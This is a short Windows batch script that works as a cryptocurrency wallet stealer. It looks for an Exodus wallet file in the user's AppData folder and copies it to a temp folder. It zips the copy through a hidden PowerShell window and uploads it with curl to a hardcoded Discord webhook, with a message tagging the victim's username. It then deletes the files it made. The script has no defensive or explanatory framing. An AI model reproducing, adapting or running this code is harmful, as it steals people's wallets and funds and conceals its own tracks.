@echo off
set webhook="https://discord.com/api/webhooks/1373367598137479200/c7T_0bvOfuOi_KutlWFa4HdYoNZkjTMlBGMmngQ4Ced_JTI2LXN3N2TJ3DL4_QBZCycD"
if exist %appdata%\Exodus\exodus.wallet (
    md %temp%\wallet
    copy %appdata%\Exodus\exodus.wallet %temp%\wallet >nul
    powershell -windowstyle hidden -command "Compress-Archive -Path '%temp%\wallet\*' -DestinationPath '%temp%\%username%-exodus.zip'" >nul
    curl -k -F "payload_json={\"content\": \"@everyone New exodus log: ``%username%``\"}" -F "file1=@%temp%\%username%-exodus.zip" %webhook% >nul
    del %temp%\%username%-exodus.zip
    rmdir /s /q %temp%\wallet
) else (
    exit
)